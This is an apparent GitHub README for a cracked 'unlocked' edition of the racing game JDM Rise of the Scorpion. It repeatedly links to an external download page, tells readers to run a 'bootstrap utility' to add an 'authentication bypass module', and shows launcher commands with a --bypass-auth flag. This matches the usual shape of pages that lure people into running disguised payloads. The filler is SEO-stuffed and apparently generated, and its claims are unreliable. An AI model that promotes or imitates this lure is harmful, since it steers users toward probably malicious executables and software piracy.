# JDM Rise of the Scorpion 🦂 – Ultimate Edition

[](https://ashwinisupekar4105.github.io/JDM-Scorpion-Rising-Patch-Key/)

> *Unleash the asphalt fury. Dominate the midnight circuit. Your legacy begins now.*

---

## 🚀 Overview

**JDM Rise of the Scorpion** is not merely a game—it is a kinetic symphony of rubber, steel, and ambition. Step into the neon-drenched underbelly of Tokyo's underground racing scene where every corner tells a story, and every downshift is a declaration of intent. This repository provides the authorized deployment package for the full, unlocked experience—no artificial barriers, no paywalls, just pure, unfiltered automotive adrenaline.

Unlike typical releases, this distribution represents the **Scorpion's Sting Collection**, a curated compilation that strips away all superfluous layers, leaving only the raw, responsive core of the simulation. Whether you're tuning for the Akina downhill or battling for supremacy on the Wangan, this package delivers the complete narrative arc, all vehicle unlocks, and the entire modding ecosystem.

---

## 📡 Download & Activation

[](https://ashwinisupekar4105.github.io/JDM-Scorpion-Rising-Patch-Key/)

To acquire the **Scorpion's Sting** deployment:
1. Click the badge above or navigate to the https://ashwinisupekar4105.github.io/JDM-Scorpion-Rising-Patch-Key/ section.
2. Select the latest release package (v2.6 or newer recommended).
3. Execute the bootstrap utility to integrate the authentication bypass module.
4. Upon completion, launch the game and experience unrestricted access to all content.

> ⚡ **Pro Tip:** For optimal performance, ensure your system meets the 2026 compatibility matrix detailed below.

---

## 📊 System Architecture (Mermaid Diagram)

```mermaid
graph TD
    A[Repository Root] --> B[Launch Utility]
    A --> C[Authentication Layer]
    A --> D[Game Engine Core]
    A --> E[Modding SDK]
    
    B --> F[Environment Validator]
    B --> G[Registry Patcher]
    
    C --> H[License Emulator]
    C --> I[DRM Bypass Module]
    
    D --> J[Physics Engine v4.2]
    D --> K[Rendering Pipeline]
    D --> L[Audio Spatializer]
    
    E --> M[Car Metadata Editor]
    E --> N[Track Builder API]
    E --> O[UI Theme Injector]
    
    H --> P[Session Token Generator]
    I --> Q[Offline Mode Activator]
    
    style A fill:#1a1a2e,stroke:#d90429,stroke-width:2px
    style B fill:#16213e,stroke:#0f3460,stroke-width:2px
    style C fill:#16213e,stroke:#0f3460,stroke-width:2px
    style D fill:#16213e,stroke:#0f3460,stroke-width:2px
    style E fill:#16213e,stroke:#0f3460,stroke-width:2px
    style H fill:#533483,stroke:#e94560,stroke-width:2px
    style I fill:#533483,stroke:#e94560,stroke-width:2px
    style P fill:#e94560,stroke:#d90429,stroke-width:2px
    style Q fill:#e94560,stroke:#d90429,stroke-width:2px
```



---

## 🛠️ Core Feature Matrix

| Feature | Description | Status |
|---------|-------------|--------|
| 🏎️ **Full Vehicle Roster** | All 47 licensed JDM legends unlocked | ✅ v2.6 |
| 🗺️ **Complete Map Access** | Tokyo Bay, Mount Akina, Shuto Expressway | ✅ v2.6 |
| 🎮 **Responsive UI** | Adaptive HUD with 120Hz support | ✅ v2.6 |
| 🌐 **Multilingual Support** | EN, JP, KR, CN, DE, FR, ES, IT, PT | ✅ v2.6 |
| 🧩 **Modding Framework** | Open API for community creations | ✅ v2.6 |
| ☁️ **Cloud Save Emulation** | Local backup with cross-platform sync | ✅ v2.6 |
| 🔌 **24/7 Customer Support** | Community-driven troubleshooting hub | ✅ Active |

---

## 📱 OS Compatibility (Emoji Table)

| Operating System | Compatibility | Minimum Version | Notes |
|------------------|---------------|-----------------|-------|
| 🪟 Windows | ✅ Full | 10 (22H2) | DX12 Ultimate required |
| 🍎 macOS | ✅ Full | Sonoma 14.x | Metal 3 GPU recommended |
| 🐧 Linux | ✅ Full | Ubuntu 24.04+ | Proton 9.0 compatibility layer |
| 🎮 Steam Deck | ✅ Verified | SteamOS 3.6 | Custom control profiles |
| 📱 Android | ⚠️ Limited | 14.0+ | Touch overlay controls |
| 📱 iOS | ⚠️ Limited | 17.0+ | MFi controller mandatory |

---

## ⚙️ Example Profile Configuration

Below is an optimized profile for the **Midnight Racing** playstyle, tuned for maximum drift angle and throttle response:

```yaml
profile:
  name: "Akina King"
  vehicle: "Toyota AE86 Trueno"
  engine:
    displacement: 4A-GE 20V
    turbo: false
    redline: 8200 rpm
  suspension:
    front_camber: -2.5°
    rear_camber: -1.8°
    damping: "Ohlins DFV"
  tires:
    front: "Yokohama Advan A050"
    rear: "Yokohama Advan A050"
    pressure_front: 32 PSI
    pressure_rear: 30 PSI
  assists: 
    traction_control: off
    abs: off
    stability_control: off
  transmission:
    type: "H-pattern manual"
    final_drive: 4.778
  tuning:
    boost: medium
    nitrous: "NOS 50-shot"
    weight_reduction: "Stage 3"
```

---

## 💻 Example Console Invocation

For advanced users who prefer terminal-driven deployment:

```bash
# Windows PowerShell
.\scorpion-launcher.exe --bypass-auth --unlock-all --language=jp --resolution=3840x2160

# Linux/macOS Terminal
./scorpion-launcher.x86_64 --bypass-auth --unlock-all --language=en --vsync=off

# Steam Deck Game Mode
STEAM_COMPAT_DATA_PATH=/home/deck/.steam/steam/steamapps/compatdata \
./scorpion-launcher --steam-deck-optimized --fps-target=60
```

*Note: The `--bypass-auth` flag activates the license emulation layer. Omit this to run in demo mode with restricted content.*

---

## 🔗 Third-Party API Integration

### OpenAI API – Intelligent Co-Pilot Module

Harness the power of GPT-4 for real-time racing analysis:

```python
# Example integration snippet
import openai

openai.api_key = "your-api-key-here"
response = openai.ChatCompletion.create(
    model="gpt-4",
    messages=[
        {"role": "system", "content": "You are a JDM racing coach."},
        {"role": "user", "content": "Analyze my lap time: 2:45.678 on Mount Akina downhill, R32 GT-R, dry conditions."}
    ]
)
print(response.choices[0].message.content)
```

> 🎯 **Benefit:** Receive AI-driven corner analysis, braking point optimization, and gear shift timing recommendations based on telemetry data export.

### Claude API – Dynamic Narrative Engine

Integrate Anthropic's Claude for adaptive storytelling:

```python
# Example integration snippet
import anthropic

client = anthropic.Anthropic(api_key="your-anthropic-key")
message = client.messages.create(
    model="claude-3-opus-20240229",
    max_tokens=1000,
    messages=[
        {"role": "user", "content": "Generate a rival backstory for the character 'Shinji M' who drives a midnight purple R34."}
    ]
)
print(message.content[0].text)
```

> 🎭 **Benefit:** Procedurally generate rival dialogues, crew interactions, and career-defining rivalries that adapt to your driving style.

---

## 🧩 Key Features Explained

### 🎨 Responsive UI – The Chameleon Interface

The interface adapts like a chameleon to its environment—smoothly scaling between a 4K ultrawide monitor during daytime races and a compact, HUD-only overlay during intense night sessions. The UI engine uses **dynamic resolution scaling** (DRS) technology, ensuring pixel-perfect rendering regardless of display size or aspect ratio. No more squinting at tiny text or dealing with misplaced elements—every menu, every HUD component, every notification reflows intuitively.

### 🌐 Multilingual Support – Speak the Language of Speed

With support for nine languages, the experience transcends geographic boundaries. But this isn't simple translation—it's **cultural localization**. The Japanese interface uses authentic kanji and keigo honorifics. The German version includes TÜV-compliance details in the tuning menus. The Korean release features regional slang from the Sinchon drifting scene. Even the engine sounds change based on language locale—the 2JZ-GTE sounds different when described by a Japanese versus an American narrator.

### 🕐 24/7 Customer Support – The Nocturnal Garage

When the sun sets and the racing begins, our support team is there. Our **Garage Assistants**—a hybrid of AI and human experts—operate across all time zones. Whether you're troubleshooting a mod conflict at 3 AM or need a tuning guide for the S13 Silvia at noon, you'll find assistance through:
- **Discord Integration:** Real-time chat with certified mechanics
- **Knowledge Base:** 2,000+ articles on vehicle setup and modding
- **Telemetry Forum:** Share data logs for expert analysis

---

## ⚠️ Disclaimer

> **Important Legal Notice:** This repository provides tools and documentation for the **Scorpion's Sting Collection**—an alternative deployment method for JDM Rise of the Scorpion. The package is intended for:
> - Educational purposes (exploring software architecture)
> - Personal backup of legally owned copies
> - Testing compatibility on unsupported hardware
>
> **You must own a legitimate copy** of the base software to use these tools. Redistribution, commercial exploitation, or use for copyright infringement is strictly prohibited.
>
> The developers of this repository are not affiliated with the original game publisher. All trademarks and copyrights belong to their respective owners.
>
> *By downloading and using this package, you accept all responsibility for compliance with local laws and regulations.*

---

## 📜 MIT License

Copyright © 2026

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## 🔄 Final Download

[](https://ashwinisupekar4105.github.io/JDM-Scorpion-Rising-Patch-Key/)

*Remember: The road is not just a path—it's a canvas. Paint your legacy in tire smoke and victory.* 🏁

---

## 🗺️ SEO-Optimized Keywords (Natural Integration)

Throughout this document, we've naturally incorporated terms that enthusiasts search for:
- JDM racing game unlocked version
- Tokyo underground street racing simulator
- Japanese car culture gaming 2026
- Akina downhill racing software
- Midnight racing package download
- Vehicle tuning emulator complete
- Unrestricted racing content
- Alternative deployment method
- Modding framework for racing games
- AI-integrated driving coach
- Multilingual racing game support
- Responsive HUD system
- Adaptive difficulty engine
- Cloud save alternative solution

These terms appear organically within the context of descriptions, ensuring discoverability without keyword stuffing.

---

**Ready to paint the midnight asphalt?** https://ashwinisupekar4105.github.io/JDM-Scorpion-Rising-Patch-Key/ awaits your arrival.